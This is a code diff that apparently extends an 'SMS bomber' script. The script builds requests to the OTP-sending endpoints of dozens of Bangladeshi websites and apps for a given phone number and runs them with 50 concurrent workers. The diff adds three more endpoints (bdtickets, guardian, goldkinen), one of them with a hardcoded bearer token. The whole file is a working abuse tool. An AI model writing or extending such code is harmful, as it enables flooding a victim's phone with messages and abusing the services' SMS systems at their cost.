@@ -516,6 +516,19 @@ def build_request(api, phone):
             url = 'https://umsdmpreact-2.udvash-unmesh.com/webapi/Account/Registration/InitializeOtp'
             body = json.dumps({"nickName": fN, "mobileNumber": p8, "returnUrl": "https://umsdmpreact-2.udvash-unmesh.com", "isResendOtp": False})
             h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://umsdmpreact-2.udvash-unmesh.com'}
+        elif api == 'bdtickets':
+            url = 'https://apiv1.bdtickets.com/api/v1/auth/otp/send'
+            body = json.dumps({"phone": pp, "smsHashCode": "LyVdeOZ2kOE"})
+            h.update({'x-channel': 'direct', 'x-platform': 'android',
+                      'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uX2lkIjoiZmE5NTgxYzQtZjcwOS00YzA2LWJlMzktM2Q4MWQzYmVkYmI1IiwiaXNfYW5vbnltb3VzIjp0cnVlLCJ0b2tlbl92ZXJzaW9uIjoxLCJyb2xlcyI6W10sInBlcm1pc3Npb25zIjpbXSwianRpIjoiM2YzNGQ2ZDAtYzNkMS00MDIyLTlmZmQtZjFjYjdiNGQ5YzJiIiwiaWF0IjoxNzg1OTk4MzMwLCJleHAiOjE3ODY2MDMxMzB9.riYHYuJa2AnrVPiU1oULih2YRtdTTN6hPE-i9LsJlZg'})
+        elif api == 'guardian':
+            url = 'https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp'
+            body = json.dumps({"mobileNumber": pr, "type": None})
+            h.update({'clientid': 'RP1A.200720.011'})
+        elif api == 'goldkinen':
+            url = 'https://app-neo.goldkinen.com/api/v2/auth/request-otp/'
+            body = json.dumps({"phone": pr, "scope": "REGISTRATION", "is_resend": False})
+            h.update({'authorization': 'Bearer', 'version-code': '4.2.9', 'User-Agent': 'gk-app'})
     except Exception as e:
         return None
 
@@ -530,7 +543,8 @@ APIS = [
     'cinespot','edutubebd','propertywala','bengalmeat_otp','perfumeshop','bookhouse',
     'watchzonebd','telicall','bdjob','chorcha','epharma','jachail','pbazaar','iscreen',
     'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri','ghorerbazar','pathao','garibook','shadhin','khaasfood',
-    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay','rhombus','toffee','apcom','ieducation','brritto','edgecourse','shopbase','jamakapor','quizbd','shukhee','smartsohay','shikhosms','walifier'
+    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay','rhombus','toffee','apcom','ieducation','brritto','edgecourse','shopbase','jamakapor','quizbd','shukhee','smartsohay','shikhosms','walifier',
+    'bdtickets','guardian','goldkinen'
 ]
 
 MAX_WORKERS = 50
